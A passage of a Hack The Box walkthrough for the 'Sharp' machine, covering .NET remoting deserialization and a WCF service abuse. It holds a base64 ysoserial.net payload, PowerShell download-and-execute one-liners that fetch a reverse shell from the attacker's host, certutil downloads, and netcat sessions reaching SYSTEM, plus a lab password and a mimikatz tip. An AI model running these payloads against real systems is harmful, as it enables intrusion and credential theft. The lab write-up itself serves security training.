yaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.InvalidCastException: Unable to cast object of <span class="built_in">type</span> <span class="string">&#x27;System.Collections.Generic.SortedSet`1[System.String]&#x27;</span> to <span class="built_in">type</span> <span class="string">&#x27;System.Runtime.Remoting.Messaging.IMessage&#x27;</span>.</span><br><span class="line">   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)</span><br><span class="line">   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage&amp; responseMsg, ITransportHeaders&amp; responseHeaders, Stream&amp; responseStream)</span><br></pre></td></tr></table></figure>
+
+<p>Ignore the error output. What you want to focus on is your python web server. We should see the victim machine pick up our reverse shell file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.219 - - [10/Jan/2021 01:57:04] <span class="string">&quot;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>And we have a shell as Lars</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">D:\1.pentesttool\内网渗透&gt;nc.exe -lvp 4321</span><br><span class="line">listening on [any] 4321 ...</span><br><span class="line">connect to [10.10.14.5] from DESKTOP-9LSPC40 [10.10.10.219] 49678</span><br><span class="line">Windows PowerShell running as user lars on SHARP</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">sharp\lars</span><br><span class="line">PS C:\Windows\system32&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\SHARP</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            debug                    DefaultAccount</span><br><span class="line">Guest                    lars                     WDAGUtilityAccount</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
+
+<p>and got the user flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\lars\desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\lars\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---         1/7/2021   2:17 PM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\<span class="built_in">users</span>\lars\desktop&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">dc4569514afab6cd583ad1259b69eb38</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb149.jpg"></li>
+</ul>
+<h3 id="Lars-Shell"><a href="#Lars-Shell" class="headerlink" title="Lars Shell"></a>Lars Shell</h3><p>We can get the user flag and then enumerate the machine to find a way to escalate our privileges.In Lars’ Documents, directory there’s some stuff to do with wcf.</p>
+<ul>
+<li>Let’s bring the files back onto our Windows VM, and read them.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\lars\documents\wcf&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\lars\documents\wcf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                .vs                                                                  </span><br><span class="line">d-----       11/15/2020   1:40 PM                Client                                                               </span><br><span class="line">d-----       11/15/2020   1:40 PM                packages                                                             </span><br><span class="line">d-----       11/15/2020   1:40 PM                RemotingLibrary                                                      </span><br><span class="line">d-----       11/15/2020   1:41 PM                Server                                                               </span><br><span class="line">-a----       11/15/2020  12:47 PM           2095 wcf.sln</span><br></pre></td></tr></table></figure>
+
+<h3 id="Transfer"><a href="#Transfer" class="headerlink" title="Transfer"></a>Transfer</h3><p>We can zip the wcf directory:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\lars\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                wcf                                                                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; Compress-Archive -LiteralPath C:\<span class="built_in">users</span>\lars\Documents\wcf -DestinationPath C:\<span class="built_in">users</span>\lars\Documents\wcf.zip</span><br><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\lars\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                wcf                                                                  </span><br><span class="line">-a----         1/9/2021   6:09 PM       11598452 wcf.zip</span><br></pre></td></tr></table></figure>
+
+<p>And now, we can move the zipped folder to the dev smb we had remote access to:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move-item -path C:\<span class="built_in">users</span>\lars\Documents\wcf.zip -destination c:\dev</span><br></pre></td></tr></table></figure>
+
+<p>Back on our windows VM, we can load the Dev share up:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net use X: \\10.10.10.219\dev</span><br><span class="line">为“10.10.10.219”输入用户名: lars</span><br><span class="line">输入 10.10.10.219 的密码:</span><br><span class="line">命令成功完成。</span><br><span class="line"><span class="comment">#Puts lars and his password in: G123HHrth234gRG</span></span><br></pre></td></tr></table></figure>
+
+<p>And if you look in your Windows VM network, the victim’s dev SMB share will be there waiting as DriveX</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb150.jpg"></li>
+</ul>
+<h3 id="Exploring-WCF"><a href="#Exploring-WCF" class="headerlink" title="Exploring WCF"></a>Exploring WCF</h3><p>If we open up the .sln file that was in the WCF directory, we can read how it works in Visual Studio</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb151.jpg"></li>
+</ul>
+<p>We can look further into the Client’s main function</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb152.jpg"></li>
+</ul>
+<p>This seems to connect to port 8889 running on the victim machine, which we will assume is a service running as a privileged user.</p>
+<ul>
+<li>The plan is then to add some malicious code for a reverse shell, re-compile this into a binary and upload it to the victim, and then execute it to receive a privileged shell.</li>
+</ul>
+<h3 id="Build-the-Exploit"><a href="#Build-the-Exploit" class="headerlink" title="Build the Exploit"></a>Build the Exploit</h3><p>We can add a line underneath the last console.Write line . This will repeat the same way we got the User shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Console.WriteLine(wcfService.InvokePowerShell(<span class="string">&quot;iex (new-object net.webclient).downloadstring(&#x27;http://10.10.14.5/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb153.jpg"></li>
+</ul>
+<p>Then build the solution, and note the directories that the client and remote .dll are.</p>
+<h3 id="Transfer-II"><a href="#Transfer-II" class="headerlink" title="Transfer II"></a>Transfer II</h3><p>Unfortunately, I wasn’t able to just chuck these files back into the SMB share we networked too.However I didn’t try very hard to make it work.</p>
+<p>Instead, I coped the client and wcf remote dll back into the directory where I set up my python web server, and then pulled both of these onto the victim machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://10.10.14.5/WcfRemotingLibrary.dll&quot;</span> WcfRemotingLibrary.dll</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1e00</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://10.10.14.5/WcfClient.exe&quot;</span> WcfClient.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1400</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\lars\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       11/15/2020   1:40 PM                wcf</span><br><span class="line">-a----         1/9/2021   6:51 PM           5120 WcfClient.exe</span><br><span class="line">-a----         1/9/2021   6:50 PM           7680 WcfRemotingLibrary.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>In powershell, we can execute this client via</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\lars\documents&gt; .\WcfClient.exe http://10.10.14.5/Invoke-PowerShellTcp.ps1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Be sure you have a netcat reverse shell waiting.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">D:\1.pentesttool\内网渗透&gt;nc.exe -lvp 4322</span><br><span class="line">listening on [any] 4322 ...</span><br><span class="line">connect to [10.10.14.5] from DESKTOP-9LSPC40 [10.10.10.219] 49692</span><br><span class="line">Windows PowerShell running as user SHARP$ on SHARP</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">cd</span> /users/administrator/desktop</span><br><span class="line">PS C:\<span class="built_in">users</span>\administrator\desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                   </span><br><span class="line">----                -------------         ------ ----                                                                   </span><br><span class="line">-ar---         1/7/2021   2:17 PM             34 root.txt                                                               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\<span class="built_in">users</span>\administrator\desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">5a631ff304d673cdd9f775ce5bc81879</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb154.jpg"></li>
+</ul>
+<p>And we’re root! This Shell won’t last long, so be careful!</p>
+<ul>
+<li>If you want to do post-root activities, upload a netcat binary and have the new system shell quickly use this binary to create a new reverse shell.</li>
+</ul>
+<p>use mimikatz to retrieve the admin’s hash, for persistence.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb155.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>SMB enumeration</li>
+<li>ack tool usage</li>
+<li>reset password by remove the existing password fields</li>
+<li>make Lars admin in the config file to get Administrator’s pass</li>
+<li>De-compiling and compiling file use dnspy</li>
+<li>use ExploitRemotingService and ysoserial.net and nc.exe to get a reverse shell</li>
+<li>powershell commands to zip and move files</li>
+<li>use certutil -urlcache -split -f “” to download files</li>
+<li>make use of service running as a privileged user to escalate to administrator</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/01/08/sharp/" title="Hack-The-Box-walkthrough[sharp]">https://fdlucifer.github.io/2021/01/08/sharp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/05/jop-and-pcop/" rel="prev" title="Jump-Oriented编程-[JOP]-一种新的代码复用攻击">
+                  <i class="fa fa-chevron-left"></i> Jump-Oriented编程-[JOP]-一种新的代码复用攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/11/sick-rop/" rel="next" title="Hack-The-Box-pwn-challenge[sick-rop]">
+                  Hack-The-Box-pwn-challenge[sick-rop] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
